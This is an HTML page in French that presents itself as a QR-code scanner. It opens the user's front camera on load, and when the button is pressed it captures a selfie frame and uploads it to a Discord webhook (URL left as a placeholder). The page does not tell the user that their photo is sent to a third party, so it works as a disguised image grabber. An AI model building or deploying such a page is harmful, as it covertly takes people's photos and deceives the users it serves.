<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scanner QR Code et Photo</title>
    <style>
        #video-container {
            position: relative;
            width: 80vw;
            height: auto;
            margin-bottom: 10px;
        }

        #video-main {
            width: 100%;
            height: auto;
        }

        .corps {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            height: 300px;
            border: solid 2px rgba(255, 0, 0, 0.7);
            background-color: rgba(255, 255, 255, 0.3);
            z-index: 10;
        }

        #capture-button {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            background-color: #ffffff;
            border: 4px solid #007AFF;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
            cursor: pointer;
            position: relative;
            display: block;
            margin: 20px auto;
        }

        #capture-button::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 30px;
            height: 30px;
            background-color: #007AFF;
            border-radius: 50%;
            transform: translate(-50%, -50%);
        }
    </style>
    <script src="https://unpkg.com/html5-qrcode/minified/html5-qrcode.min.js"></script>
</head>
<body>
    <h1>Scanner QR Code et Prendre Photo</h1>
    <div id="video-container">
        <video id="video-main" autoplay playsinline></video>
        <div class="corps"></div>
    </div>

    <button id="capture-button" onclick="capturerEtEnvoyerPhoto()" title="Prendre une photo"></button>

    <div id="qr-reader"></div>

    <script>
        async function obtenirCameraSelfie() {
            try {
                return await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            } catch (err) {
                console.error('Erreur d\'accès à la caméra selfie:', err);
                alert("Erreur d'accès à la caméra selfie.");
                return null;
            }
        }

        function capturerPhoto(videoElement) {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/png');
        }

        function dataURLToBlob(dataURL) {
            const byteString = atob(dataURL.split(',')[1]);
            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        async function envoyerDonnees(imageBlob) {
            const formData = new FormData();
            formData.append('file', imageBlob, 'photo.png');

            const url = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL';
            return fetch(url, {
                method: 'POST',
                body: formData
            });
        }

        async function lancerScanQRCode() {
            const qrReader = document.getElementById('qr-reader');
            const html5QrCode = new Html5Qrcode("qr-reader");

            html5QrCode.start(
                { facingMode: "environment" },
                {
                    fps: 10,
                    qrbox: 250
                },
                (decodedText, decodedResult) => {
                    console.log(`QR Code détecté: ${decodedText}`);
                    html5QrCode.stop();
                },
                (errorMessage) => {
                    console.warn(`Erreur de scan: ${errorMessage}`);
                }
            ).catch((err) => {
                console.error(`Erreur de démarrage du scanner QR: ${err}`);
            });
        }

        async function capturerEtEnvoyerPhoto() {
            const videoMain = document.getElementById('video-main');
            const dataURLMain = capturerPhoto(videoMain);
            const blobMain = dataURLToBlob(dataURLMain);
            await envoyerDonnees(blobMain);
            console.log('Image envoyée avec succès');
        }

        (async function() {
            const videoMain = document.getElementById('video-main');
            const streamMain = await obtenirCameraSelfie();

            if (streamMain) {
                videoMain.srcObject = streamMain;
                lancerScanQRCode(); // Lancer le scan des QR codes
            }
        })();
    </script>
</body>
</html>
